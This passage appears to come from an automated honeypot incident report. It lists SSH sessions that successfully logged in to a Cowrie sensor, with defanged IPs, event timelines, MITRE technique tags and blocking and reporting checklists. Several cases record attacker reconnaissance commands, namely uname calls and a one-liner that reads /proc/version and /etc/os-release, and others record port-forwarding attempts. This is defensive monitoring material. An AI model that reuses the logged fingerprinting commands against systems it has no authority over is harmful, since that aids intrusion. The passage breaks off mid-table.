| Unique ASNs | **108** |
| High-Risk ASNs | **97** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 11 | HIGH |
| `AS46562` | Performive LLC | 10 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 9 | MEDIUM |
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS25159` | PJSC MegaFon | 4 | HIGH |
| `AS3301` | Telia Company AB | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (247)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-45b02b2e426b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 04:55 |
| **Last Seen** | 2026-07-22 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 04:55:45` | `cowrie.session.connect` |
| `2026-07-22 04:55:45` | `cowrie.client.version` |
| `2026-07-22 04:55:46` | `cowrie.client.kex` |
| `2026-07-22 04:55:46` | `cowrie.login.success` |
| `2026-07-22 04:55:47` | `cowrie.session.params` |
| `2026-07-22 04:55:47` | `cowrie.command.input` |
| `2026-07-22 04:55:47` | `cowrie.log.closed` |
| `2026-07-22 04:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f9273ca67f4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 04:56 |
| **Last Seen** | 2026-07-22 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 04:56:41` | `cowrie.session.connect` |
| `2026-07-22 04:56:41` | `cowrie.client.version` |
| `2026-07-22 04:56:41` | `cowrie.client.kex` |
| `2026-07-22 04:56:42` | `cowrie.login.success` |
| `2026-07-22 04:56:43` | `cowrie.session.params` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.command.success` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.command.input` |
| `2026-07-22 04:56:43` | `cowrie.log.closed` |
| `2026-07-22 04:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6e777d4308

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 04:57 |
| **Last Seen** | 2026-07-22 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 04:57:51` | `cowrie.session.connect` |
| `2026-07-22 04:57:51` | `cowrie.client.version` |
| `2026-07-22 04:57:51` | `cowrie.client.kex` |
| `2026-07-22 04:57:51` | `cowrie.login.success` |
| `2026-07-22 04:57:52` | `cowrie.session.params` |
| `2026-07-22 04:57:52` | `cowrie.command.input` |
| `2026-07-22 04:57:52` | `cowrie.log.closed` |
| `2026-07-22 04:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-635bd0a62dc9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 04:58 |
| **Last Seen** | 2026-07-22 04:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 04:58:46` | `cowrie.session.connect` |
| `2026-07-22 04:58:46` | `cowrie.client.version` |
| `2026-07-22 04:58:46` | `cowrie.client.kex` |
| `2026-07-22 04:58:47` | `cowrie.login.success` |
| `2026-07-22 04:58:48` | `cowrie.session.params` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.command.success` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.command.input` |
| `2026-07-22 04:58:48` | `cowrie.log.closed` |
| `2026-07-22 04:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7caf007d2666

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:00 |
| **Last Seen** | 2026-07-22 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:00:06` | `cowrie.session.connect` |
| `2026-07-22 05:00:06` | `cowrie.client.version` |
| `2026-07-22 05:00:06` | `cowrie.client.kex` |
| `2026-07-22 05:00:06` | `cowrie.login.success` |
| `2026-07-22 05:00:07` | `cowrie.session.params` |
| `2026-07-22 05:00:07` | `cowrie.command.input` |
| `2026-07-22 05:00:07` | `cowrie.log.closed` |
| `2026-07-22 05:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a5f9807c19

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:00 |
| **Last Seen** | 2026-07-22 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:00:42` | `cowrie.session.connect` |
| `2026-07-22 05:00:42` | `cowrie.client.version` |
| `2026-07-22 05:00:42` | `cowrie.client.kex` |
| `2026-07-22 05:00:42` | `cowrie.login.success` |
| `2026-07-22 05:00:43` | `cowrie.session.params` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:43` | `cowrie.command.success` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:43` | `cowrie.command.input` |
| `2026-07-22 05:00:44` | `cowrie.log.closed` |
| `2026-07-22 05:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0a34fd83221

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:02 |
| **Last Seen** | 2026-07-22 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:02:11` | `cowrie.session.connect` |
| `2026-07-22 05:02:11` | `cowrie.client.version` |
| `2026-07-22 05:02:11` | `cowrie.client.kex` |
| `2026-07-22 05:02:11` | `cowrie.login.success` |
| `2026-07-22 05:02:12` | `cowrie.session.params` |
| `2026-07-22 05:02:12` | `cowrie.command.input` |
| `2026-07-22 05:02:12` | `cowrie.log.closed` |
| `2026-07-22 05:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92045bb49e8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:02 |
| **Last Seen** | 2026-07-22 05:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:02:36` | `cowrie.session.connect` |
| `2026-07-22 05:02:36` | `cowrie.client.version` |
| `2026-07-22 05:02:36` | `cowrie.client.kex` |
| `2026-07-22 05:02:37` | `cowrie.login.success` |
| `2026-07-22 05:02:39` | `cowrie.session.params` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.command.success` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.command.input` |
| `2026-07-22 05:02:39` | `cowrie.log.closed` |
| `2026-07-22 05:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab731ca48f58

| Field | Detail |
|---|---|
| **Source IP** | `182.151.45[.]136` |
| **First Seen** | 2026-07-22 05:04 |
| **Last Seen** | 2026-07-22 05:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:04:18` | `cowrie.session.connect` |
| `2026-07-22 05:04:19` | `cowrie.client.version` |
| `2026-07-22 05:04:19` | `cowrie.client.kex` |
| `2026-07-22 05:04:22` | `cowrie.login.success` |
| `2026-07-22 05:04:24` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.151.45[.]136` to AbuseIPDB if not already reported
- [ ] Block `182.151.45[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bba1a490c6c5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:04 |
| **Last Seen** | 2026-07-22 05:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:04:25` | `cowrie.session.connect` |
| `2026-07-22 05:04:26` | `cowrie.client.version` |
| `2026-07-22 05:04:26` | `cowrie.client.kex` |
| `2026-07-22 05:04:28` | `cowrie.login.success` |
| `2026-07-22 05:04:29` | `cowrie.session.params` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.command.success` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.command.input` |
| `2026-07-22 05:04:29` | `cowrie.log.closed` |
| `2026-07-22 05:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d7a8e70d7d8

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-22 05:04 |
| **Last Seen** | 2026-07-22 05:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:04:29` | `cowrie.session.connect` |
| `2026-07-22 05:04:29` | `cowrie.client.version` |
| `2026-07-22 05:04:29` | `cowrie.client.kex` |
| `2026-07-22 05:04:30` | `cowrie.login.success` |
| `2026-07-22 05:04:31` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d14c72b07102

| Field | Detail |
|---|---|
| **Source IP** | `182.225.134[.]13` |
| **First Seen** | 2026-07-22 05:05 |
| **Last Seen** | 2026-07-22 05:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:05:02` | `cowrie.session.connect` |
| `2026-07-22 05:05:02` | `cowrie.client.version` |
| `2026-07-22 05:05:02` | `cowrie.client.kex` |
| `2026-07-22 05:05:04` | `cowrie.login.success` |
| `2026-07-22 05:05:05` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.225.134[.]13` to AbuseIPDB if not already reported
- [ ] Block `182.225.134[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca59aaa2ff4e

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-07-22 05:05 |
| **Last Seen** | 2026-07-22 05:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:05:10` | `cowrie.session.connect` |
| `2026-07-22 05:05:10` | `cowrie.client.version` |
| `2026-07-22 05:05:10` | `cowrie.client.kex` |
| `2026-07-22 05:05:11` | `cowrie.login.success` |
| `2026-07-22 05:05:11` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5353584fc566

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:06 |
| **Last Seen** | 2026-07-22 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:06:13` | `cowrie.session.connect` |
| `2026-07-22 05:06:14` | `cowrie.client.version` |
| `2026-07-22 05:06:14` | `cowrie.client.kex` |
| `2026-07-22 05:06:15` | `cowrie.login.success` |
| `2026-07-22 05:06:17` | `cowrie.session.params` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.command.success` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.command.input` |
| `2026-07-22 05:06:17` | `cowrie.log.closed` |
| `2026-07-22 05:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb49501a2e1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:06 |
| **Last Seen** | 2026-07-22 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:06:39` | `cowrie.session.connect` |
| `2026-07-22 05:06:39` | `cowrie.client.version` |
| `2026-07-22 05:06:39` | `cowrie.client.kex` |
| `2026-07-22 05:06:39` | `cowrie.login.success` |
| `2026-07-22 05:06:40` | `cowrie.session.params` |
| `2026-07-22 05:06:40` | `cowrie.command.input` |
| `2026-07-22 05:06:40` | `cowrie.log.closed` |
| `2026-07-22 05:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c3871d6dd3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:08 |
| **Last Seen** | 2026-07-22 05:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:08:03` | `cowrie.session.connect` |
| `2026-07-22 05:08:03` | `cowrie.client.version` |
| `2026-07-22 05:08:03` | `cowrie.client.kex` |
| `2026-07-22 05:08:05` | `cowrie.login.success` |
| `2026-07-22 05:08:06` | `cowrie.session.params` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:06` | `cowrie.command.success` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:06` | `cowrie.command.input` |
| `2026-07-22 05:08:07` | `cowrie.log.closed` |
| `2026-07-22 05:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef09e8175060

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:08 |
| **Last Seen** | 2026-07-22 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:08:54` | `cowrie.session.connect` |
| `2026-07-22 05:08:54` | `cowrie.client.version` |
| `2026-07-22 05:08:54` | `cowrie.client.kex` |
| `2026-07-22 05:08:54` | `cowrie.login.success` |
| `2026-07-22 05:08:55` | `cowrie.session.params` |
| `2026-07-22 05:08:55` | `cowrie.command.input` |
| `2026-07-22 05:08:55` | `cowrie.log.closed` |
| `2026-07-22 05:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320beca31969

| Field | Detail |
|---|---|
